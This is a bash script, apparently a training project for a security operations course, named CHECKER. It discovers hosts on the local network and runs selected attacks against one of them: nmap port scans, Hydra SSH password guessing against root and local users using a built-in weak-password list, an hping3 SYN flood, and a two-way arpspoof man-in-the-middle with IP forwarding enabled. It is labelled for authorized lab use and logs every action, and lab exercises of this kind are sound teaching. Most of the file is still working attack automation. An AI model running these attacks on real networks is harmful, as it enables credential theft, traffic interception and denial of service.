#!/bin/bash


#################################################################
# CHECKER - Automated SOC Attack Simulation and Logging Tool    #
#                                                               #
# Discovers hosts on the local network, runs controlled         #
# security checks against a chosen target, and logs every       #
# action under /var/log/checker.log for review.                 #
#                                                               #
# FOR AUTHORIZED LAB / EDUCATIONAL USE ONLY.                    #
#################################################################


# global log file saved under /var/log #
log_file="/var/log/checker.log"

# creating empty arrays for detected targets and attack history #
targets_array=()
attack_history=()
attack_reports=()



# checks if value is a number and greater/equal to 0 #
function is_number(){
    [ -n "$1" ] && [ "$1" -ge 0 ] 2>/dev/null
}



# printing the main project banner #
function print_banner(){
    echo "---------------------------------------"
    echo "     SOC ANALYST | PROJECT: CHECKER"
    echo "---------------------------------------"
    echo ""
    sleep 1
}



# checking if the script runs with root permissions #
function check_root(){
    echo "Checking script permissions..."
    sleep 1

    # the project requires saving logs into /var/log and some tools may require root #
    if [ "$(whoami)" != "root" ]; then
        echo "ERROR - please run this script with sudo/root permissions."
        echo "Example: sudo bash checker.sh"
        exit 1
    fi

    echo "Root permissions - VALID"
    echo ""
}



# checking if required tools are installed #
function check_dependencies(){
    echo "Verifying that required tools are installed..."
    sleep 1

    # nmap - used for host discovery and port scans #
    # hydra - used for SSH weak credentials check #
    # hping3 - used for SYN flood simulation #
    for tool in nmap hydra hping3; do
        if command -v "$tool" &> /dev/null; then
            echo "[+] Found $tool"
        else
            read -p "$tool is not installed. Would you like to install it now? (y/n): " inst_choice

            if [[ "$inst_choice" == "y" || "$inst_choice" == "Y" ]]; then
                echo "Installing $tool..."
                apt update && apt install -y "$tool"
            else
                echo "Exiting program. $tool is required."
                exit 1
            fi
        fi
    done

    # arpspoof - used for the man in the middle attack #
    # arpspoof is installed as part of the dsniff package #
    if command -v arpspoof &> /dev/null; then
        echo "[+] Found arpspoof"
    else
        read -p "arpspoof is not installed. Would you like to install it now? (y/n): " inst_choice

        if [[ "$inst_choice" == "y" || "$inst_choice" == "Y" ]]; then
            echo "Installing arpspoof..."
            apt update && apt install -y dsniff
        else
            echo "Exiting program. arpspoof is required."
            exit 1
        fi
    fi

    echo ""
}



# preparing the log file inside /var/log #
function prepare_log_file(){
    echo "Preparing log file..."
    sleep 1

    # creates the log file if it does not exist #
    if ! touch "$log_file"; then
        echo "ERROR - could not create the log file."
        echo "Please make sure you run the script with sudo."
        exit 1
    fi

    # adds a new session title into the log file #
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "New CHECKER session: $(date)" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"

    echo "Log file is ready - $log_file"
    echo ""
}



# writing each selected attack into the log file #
function write_log(){
    local attack_type="$1"
    local target_ip="$2"
    local current_time
    current_time=$(date)

    # the log includes attack type, time and target IP address #
    echo "$current_time | Attack: $attack_type | Target IP: $target_ip" >> "$log_file"

    # saves the attack also for the final report #
    attack_history+=("$current_time | Attack: $attack_type | Target IP: $target_ip")
}



# getting the local network range automatically #
function set_network_range(){
    echo "Finding local network range..."
    sleep 1

    # gets the first local IP address of this machine #
    local_ip=$(hostname -I | awk '{print $1}')

    if [ -z "$local_ip" ]; then
        echo "ERROR - could not find local IP address."
        echo "Please check that the VM is connected to the network."
        exit 1
    fi

    # creates a /24 network range from the local IP address #
    network_range=$(echo "$local_ip" | cut -d "." -f 1-3).0/24

    echo "Local IP is - $local_ip"
    echo "Network range is - $network_range"
    echo ""
}



## scanning the network and saving all available IP addresses #
function discover_available_ips(){
    echo "Scanning for available IP addresses on the network..."
    echo "Network range to scan - $network_range"
    sleep 1
    echo ""

    # runs nmap ping scan on the selected network range #
    scan_result=$(nmap -sn "$network_range")

    # takes only lines that contain detected hosts #
    host_lines=$(echo "$scan_result" | grep "Nmap scan report for")

    # takes the last word from each line, usually the IP address #
    detected_hosts=$(echo "$host_lines" | awk '{print $NF}')

    # removes brackets if nmap printed the IP inside brackets #
    detected_hosts=$(echo "$detected_hosts" | tr -d '()')

    # checks if no IP addresses were found #
    if [ -z "$detected_hosts" ]; then
        echo "ERROR - No available IP addresses were found."
        echo "Please check that the VM is connected to the network."
        echo "Exiting program."
        exit 1
    fi

    # saves the detected IP addresses into an array #
    targets_array=($detected_hosts)

    echo "Network scan completed."
    echo "${#targets_array[@]} available IP addresses were found."
    echo ""
}



# displaying all possible attacks with clear descriptions #
function show_attacks_menu(){
    echo "Available attacks:"
    echo "--------------------------------------------------------------"
    echo "1) Port Scan - scans the target for the top 200 common TCP ports using Nmap."
    echo "2) UDP Scan - scans common UDP ports using Nmap."
    echo "3) SSH Weak Credentials - checks for weak SSH passwords using Hydra."
    echo "4) SYN Flood - sends multiple TCP SYN packets using Hping3."
    echo "5) ARP Spoofing - performs a controlled Man in the Middle attack using Arpspoof."
    echo "6) Random Attack - chooses one attack randomly from the list."
    echo ""
}



# letting the user choose an attack #
function choose_attack(){
    show_attacks_menu

    read -p "Choose attack number 1-6: " attack_choice

    # removes spaces from the user input #
    attack_choice=$(echo "$attack_choice" | tr -d '[:space:]')

    # checks if the input is a valid number between 1 and 6 #
    if ! is_number "$attack_choice" || [ "$attack_choice" -lt 1 ] || [ "$attack_choice" -gt 6 ]; then
        echo "ERROR - invalid attack choice."
        echo "Program terminated."
        exit 1
    fi

    # if the user chose Random Attack #
    if [ "$attack_choice" -eq 6 ]; then
        attack_choice=$((RANDOM % 5 + 1))
        echo "Random attack selected - attack number $attack_choice"
    fi

    echo ""
}



# choosing a target IP by number or choosing a random target #
function choose_target(){
    echo "Choose a target IP address:"
    echo "--------------------------------------------------------------"

    counter=1

    # shows all detected IP addresses with numbers #
    for host in "${targets_array[@]}"; do
        echo "$counter) $host"
        counter=$((counter + 1))
    done

    # adds random target option #
    echo "$counter) Random Target"
    echo ""

    read -p "Choose target number 1-$counter: " target_choice

    # removes spaces from the user input #
    target_choice=$(echo "$target_choice" | tr -d '[:space:]')

    # checks if the input is a valid number #
    if ! is_number "$target_choice" || [ "$target_choice" -lt 1 ] || [ "$target_choice" -gt "$counter" ]; then
        echo "ERROR - invalid target choice."
        echo "Program terminated."
        exit 1
    fi

    # if the user chose Random Target #
    if [ "$target_choice" -eq "$counter" ]; then
        random_index=$((RANDOM % ${#targets_array[@]}))
        target_ip="${targets_array[$random_index]}"
        echo "Random target selected - $target_ip"
    else
        # array starts from 0, but the menu starts from 1 #
        target_index=$((target_choice - 1))
        target_ip="${targets_array[$target_index]}"
        echo "Selected target IP - $target_ip"
    fi

    echo ""
}



# attack 1 - Port Scan: scanning the selected target for common open TCP ports #
function attack_port_scan(){
    local target="$1"
    local attack_name="Port Scan"

    echo "Starting Port Scan attack on: $target"
    echo "Scanning the target for the top 200 common TCP ports using Nmap."
    echo ""
    sleep 1

    # running a controlled scan against the selected target and saving the output #
    scan_output=$(nmap -Pn --top-ports 200 "$target")

    # extracting only open TCP ports from the scan output #
    open_ports=$(echo "$scan_output" | grep "/tcp" | grep "open")

    echo ""
    echo "Port Scan completed."
    echo "The full summary will appear in the FINAL SESSION REPORT."
    echo "--------------------------------------------------------------"

    # preparing clean result for final report #
    if [ -n "$open_ports" ]; then
        scan_summary="Open TCP ports were found."
        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Reconnaissance
Scan Type: TCP Port Scan
Ports Scanned: Top 200 TCP ports
Result: $scan_summary

Open Ports:
$open_ports"
    else
        scan_summary="No open TCP ports were found."
        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Reconnaissance
Scan Type: TCP Port Scan
Ports Scanned: Top 200 TCP ports
Result: $scan_summary"
    fi

    # saving clean result for the final report #
    attack_reports+=("$clean_report")

    # saving full scan results into the log file #
    echo "" >> "$log_file"
    echo "Port Scan results for $target:" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$scan_output" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$clean_report" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"

    # writing the selected attack into the log file #
    write_log "$attack_name" "$target"
}



# attack 2 - UDP Scan: scanning the selected target for common UDP ports #
function attack_udp_scan(){
    local target="$1"
    local attack_name="UDP Scan"

    echo "Starting UDP Scan attack on: $target"
    echo "Scanning the target for common UDP ports using Nmap."
    echo ""
    sleep 1

    # running a controlled UDP scan against the selected target and saving the output #
    udp_output=$(nmap -sU --top-ports 20 "$target" 2>&1)

    # extracting only open UDP ports from the scan output #
    open_udp_ports=$(echo "$udp_output" | grep "/udp" | grep "open")

    echo ""
    echo "UDP Scan completed."
    echo "The full summary will appear in the FINAL SESSION REPORT."
    echo "--------------------------------------------------------------"

    # preparing clean result for final report #
    if [ -n "$open_udp_ports" ]; then
        udp_summary="Open UDP ports were found."
        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Reconnaissance
Scan Type: UDP Port Scan
Ports Scanned: Top 20 UDP ports
Result: $udp_summary

Open UDP Ports:
$open_udp_ports"
    else
        udp_summary="No open UDP ports were found."
        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Reconnaissance
Scan Type: UDP Port Scan
Ports Scanned: Top 20 UDP ports
Result: $udp_summary"
    fi

    # saving clean result for the final report #
    attack_reports+=("$clean_report")

    # saving full UDP scan results into the log file #
    echo "" >> "$log_file"
    echo "UDP Scan results for $target:" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$udp_output" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$clean_report" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"

    # writing the selected attack into the log file #
    write_log "$attack_name" "$target"
}



# attack 3 - SSH Weak Credentials: checking local users for weak SSH passwords using Hydra #
function attack_ssh_weak_credentials(){
    local target="$1"
    local attack_name="SSH Weak Credentials"
    local temp_pass_file="/tmp/checker_passwords.txt"

    echo "Starting SSH Weak Credentials attack on: $target"
    echo "Checking local users for weak SSH passwords using Hydra."
    echo ""
    sleep 1

    # checking if SSH port 22 is open before running Hydra #
    ssh_check=$(nmap -n -p 22 --open "$target" | grep "22/tcp open")

    if [ -z "$ssh_check" ]; then
        ssh_result="SSH port 22 is not open on $target. Skipping Hydra test."

        echo "$ssh_result"

        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Credential Attack
SSH Status: Closed
Result: $ssh_result"

        attack_reports+=("$clean_report")

        echo "" >> "$log_file"
        echo "$clean_report" >> "$log_file"

        write_log "$attack_name" "$target"
        return
    fi

    # accepting the SSH host key automatically for the selected target #
    mkdir -p ~/.ssh
    ssh-keyscan -H "$target" >> ~/.ssh/known_hosts 2>/dev/null

    # getting local users from this machine #
    usernames=("root")

    # reading the /etc/passwd file line by line #
    while IFS=: read -r username password user_id group_id comment home_folder user_shell; do

        # regular users usually have ID 1000 or higher #
        if [ "$user_id" -ge 1000 ] 2>/dev/null; then

            # skipping users that cannot login #
            if [[ "$user_shell" != *"nologin"* && "$user_shell" != *"false"* ]]; then
                usernames+=("$username")
            fi
        fi

    done < /etc/passwd

    echo "Users selected for Hydra test:"
    echo "--------------------------------------------------------------"
    for user in "${usernames[@]}"; do
        echo "[-] $user"
    done
    echo "--------------------------------------------------------------"
    echo ""

    # creating a small built-in password list for the project #
    rm -f "$temp_pass_file"

    cat > "$temp_pass_file" <<PASSLIST
123456
admin
password
12345678
qwerty
123123
1234
111111
root
toor
Pass@123
admin123
user
alisa
PASSLIST

    local found_credentials=false
    local users_results=""
    local hydra_results=""

    # checking each username separately #
    for user in "${usernames[@]}"; do
        echo "Checking username: $user"

        hydra_output=$(hydra -l "$user" -P "$temp_pass_file" "$target" ssh -t 1 -f 2>&1)

        # saving full Hydra output only to the log file #
        hydra_results="$hydra_results
Username checked: $user
$hydra_output
--------------------------------------------------------------"

        # looking for a successful Hydra line #
        found_line=$(echo "$hydra_output" | grep "login:" | grep "password:" | head -n 1)

        if [ -n "$found_line" ]; then
            found_password=$(echo "$found_line" | awk -F "password: " '{print $2}' | awk '{print $1}')

            found_credentials=true

            users_results="$users_results
Username: $user
Password: $found_password
Status: FOUND
---------------------------------------"
        else
            users_results="$users_results
Username: $user
Password: Not found
Status: NOT FOUND
---------------------------------------"
        fi
    done

    # deleting the temporary password file #
    rm -f "$temp_pass_file"

    echo ""
    echo "SSH Weak Credentials check completed."
    echo "The full summary will appear in the FINAL SESSION REPORT."
    echo "--------------------------------------------------------------"

    # preparing clean result for final report #
    if [ "$found_credentials" = true ]; then
        final_result="Weak SSH credentials were found."
    else
        final_result="No weak SSH credentials were found."
    fi

    clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Credential Attack
SSH Status: Open

Users Tested:
$(printf '%s\n' "${usernames[@]}")

Result: $final_result

Credentials Check:
---------------------------------------$users_results"

    # saving clean result for the final report #
    attack_reports+=("$clean_report")

    # saving full results into the log file #
    echo "" >> "$log_file"
    echo "SSH Weak Credentials results for $target:" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$hydra_results" >> "$log_file"
    echo "$clean_report" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"

    # writing the selected attack into the log file #
    write_log "$attack_name" "$target"
}



# attack 4 - SYN Flood: sending multiple TCP SYN packets to the selected target using Hping3 #
function attack_syn_flood(){
    local target="$1"
    local attack_name="SYN Flood"
    local target_port=80
    local flood_status

    echo "Starting SYN Flood attack on: $target"
    echo "Sending a controlled burst of TCP SYN packets using Hping3."
    echo ""
    sleep 1

    # sending a limited number of TCP SYN packets to simulate a denial of service attack #
    flood_output=$(hping3 -S -p "$target_port" -c 1000 -i u1000 "$target" 2>&1)
    flood_status=$?

    echo ""

    # checking if the Hping3 command completed successfully #
    if echo "$flood_output" | grep -q "1000 packets transmitted"; then
        flood_result="Controlled SYN flood simulation completed."
        echo "SYN Flood completed."
    else
        flood_result="SYN flood simulation could not be completed."
        echo "ERROR - SYN Flood could not be completed."
    fi

    echo "The full summary will appear in the FINAL SESSION REPORT."
    echo "--------------------------------------------------------------"

    # preparing clean result for final report #
    clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Denial of Service
Target Port: TCP $target_port
Packets Sent: 1000
Result: $flood_result"

    # saving clean result for the final report #
    attack_reports+=("$clean_report")

    # saving full Hping3 results into the log file #
    echo "" >> "$log_file"
    echo "SYN Flood results for $target:" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$flood_output" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$clean_report" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"

    # writing the selected attack into the log file #
    write_log "$attack_name" "$target"
}



# attack 5 - ARP Spoofing: performing a controlled man in the middle attack using Arpspoof #
function attack_arp_spoof(){
    local target="$1"
    local attack_name="ARP Spoofing"
    local network_interface
    local gateway_ip
    local previous_forwarding
    local target_pid
    local gateway_pid
    local target_status
    local gateway_status
    local arp_result
    local target_output="/tmp/checker_arpspoof_target.txt"
    local gateway_output="/tmp/checker_arpspoof_gateway.txt"

    echo "Starting ARP Spoofing attack on: $target"
    echo "Performing a controlled Man in the Middle attack using Arpspoof."
    echo ""
    sleep 1

    # detecting the default network interface #
    network_interface=$(ip route | awk '/default/ {print $5; exit}')

    # detecting the default gateway IP address #
    gateway_ip=$(ip route | awk '/default/ {print $3; exit}')

    # checking that the network interface and gateway were detected #
    if [ -z "$network_interface" ] || [ -z "$gateway_ip" ]; then
        echo "ERROR - could not detect the network interface or gateway."

        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Man in the Middle
Result: Attack could not start because the network interface or gateway was not detected."

        attack_reports+=("$clean_report")
        write_log "$attack_name" "$target"
        return
    fi

    # preventing the local machine itself from being selected as the victim #
    if [ "$target" = "$local_ip" ]; then
        echo "ERROR - the selected target is the local machine."

        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Man in the Middle
Result: Attack was skipped because the selected target is the local machine."

        attack_reports+=("$clean_report")
        write_log "$attack_name" "$target"
        return
    fi

    # preventing the gateway itself from being selected as the victim #
    if [ "$target" = "$gateway_ip" ]; then
        echo "ERROR - the selected target is the default gateway."

        clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Man in the Middle
Result: Attack was skipped because the selected target is the default gateway."

        attack_reports+=("$clean_report")
        write_log "$attack_name" "$target"
        return
    fi

    echo "Network interface: $network_interface"
    echo "Gateway IP: $gateway_ip"
    echo ""

    # saving the current IP forwarding configuration #
    previous_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)

    # enabling IP forwarding during the MITM simulation #
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # removing old temporary output files #
    rm -f "$target_output" "$gateway_output"

    # spoofing the target by pretending to be the gateway #
    timeout -s INT 8 arpspoof -i "$network_interface" -t "$target" "$gateway_ip" \
        > "$target_output" 2>&1 &
    target_pid=$!

    # spoofing the gateway by pretending to be the selected target #
    timeout -s INT 8 arpspoof -i "$network_interface" -t "$gateway_ip" "$target" \
        > "$gateway_output" 2>&1 &
    gateway_pid=$!

    # waiting for the controlled ARP spoofing simulation to finish #
    wait "$target_pid"
    target_status=$?

    wait "$gateway_pid"
    gateway_status=$?

    # restoring the original IP forwarding configuration #
    echo "$previous_forwarding" > /proc/sys/net/ipv4/ip_forward

    echo ""

    # checking if both Arpspoof processes ran successfully #
    if [[ "$target_status" -eq 0 || "$target_status" -eq 124 ]] && \
       [[ "$gateway_status" -eq 0 || "$gateway_status" -eq 124 ]] && \
       [ -s "$target_output" ] && [ -s "$gateway_output" ]; then

        arp_result="Controlled ARP spoofing simulation completed."
        echo "ARP Spoofing completed."

    else
        arp_result="ARP spoofing simulation could not be completed."
        echo "ERROR - ARP Spoofing could not be completed."
    fi

    echo "The full summary will appear in the FINAL SESSION REPORT."
    echo "--------------------------------------------------------------"

    # preparing clean result for final report #
    clean_report="Attack: $attack_name
Target IP: $target
Attack Class: Man in the Middle
Gateway IP: $gateway_ip
Network Interface: $network_interface
Result: $arp_result"

    # saving clean result for the final report #
    attack_reports+=("$clean_report")

    # saving full Arpspoof results into the log file #
    echo "" >> "$log_file"
    echo "ARP Spoofing results for $target:" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "Target spoofing output:" >> "$log_file"
    cat "$target_output" >> "$log_file"
    echo "" >> "$log_file"
    echo "Gateway spoofing output:" >> "$log_file"
    cat "$gateway_output" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"
    echo "$clean_report" >> "$log_file"
    echo "--------------------------------------------------------------" >> "$log_file"

    # deleting temporary output files #
    rm -f "$target_output" "$gateway_output"

    # writing the selected attack into the log file #
    write_log "$attack_name" "$target"
}


# executing the chosen attack function against the chosen target #
function execute_selected_attack(){
    case "$attack_choice" in
        1)
            attack_port_scan "$target_ip"
            ;;
        2)
            attack_udp_scan "$target_ip"
            ;;
        3)
            attack_ssh_weak_credentials "$target_ip"
            ;;
        4)
            attack_syn_flood "$target_ip"
            ;;
        5)
            attack_arp_spoof "$target_ip"
            ;;
        *)
            echo "ERROR - invalid attack selection."
            exit 1
            ;;
    esac
}



# displaying final session report to the user #
function generate_report(){
    echo ""
    echo "======================================="
    echo "         FINAL SESSION REPORT"
    echo "======================================="

    # displaying detected IP addresses #
    echo ""
    echo "Available IP addresses detected:"
    echo "---------------------------------------"

    if [ ${#targets_array[@]} -eq 0 ]; then
        echo "No available IP addresses were detected."
    else
        for host in "${targets_array[@]}"; do
            echo "[-] $host"
        done
    fi

    echo ""
    echo "Executed attacks:"
    echo "---------------------------------------"

    # displaying selected attacks from this session #
    if [ ${#attack_history[@]} -eq 0 ]; then
        echo "No attacks were executed in this session."
    else
        for entry in "${attack_history[@]}"; do
            echo "[-] $entry"
        done
    fi

    echo ""
    echo "Detailed attack results:"
    echo "---------------------------------------"

    # displaying clean attack summaries #
    if [ ${#attack_reports[@]} -eq 0 ]; then
        echo "No detailed attack results were saved."
    else
        for report in "${attack_reports[@]}"; do
            echo "$report"
            echo "---------------------------------------"
        done
    fi

    echo ""
    echo "Log file location: $log_file"
    echo "======================================="
    echo "      CHECKER Assessment Complete"
    echo "======================================="
}



# main function that controls the full project flow #
function main(){
    print_banner
    check_root
    check_dependencies
    prepare_log_file
    set_network_range
    discover_available_ips

    # allow the user to run more attacks #
    while true; do
        choose_target
        choose_attack
        execute_selected_attack

        echo ""
        read -p "Do you want to run another attack? (y/n): " again

        # if the user does not choose yes, stop running attacks #
        if [[ "$again" != "y" && "$again" != "Y" ]]; then
            break
        fi

        echo ""
    done

    generate_report
}


main
